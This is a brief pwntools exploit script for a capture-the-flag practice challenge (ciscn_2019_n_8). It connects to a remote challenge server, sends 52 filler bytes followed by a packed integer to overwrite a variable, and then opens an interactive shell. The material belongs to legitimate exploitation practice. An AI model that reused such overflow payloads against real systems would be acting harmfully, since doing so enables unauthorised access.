from pwn import *

#r=process('./ciscn_2019_n_8')
r= remote("node5.buuoj.cn",29438)
context.arch="i386"# x64
context.terminal=["tmux","splitw","-h"]

# gdb.attach(r,'b main')


payload=b'b'*13*4+p64(17)

r.send(payload)

r.interactive()
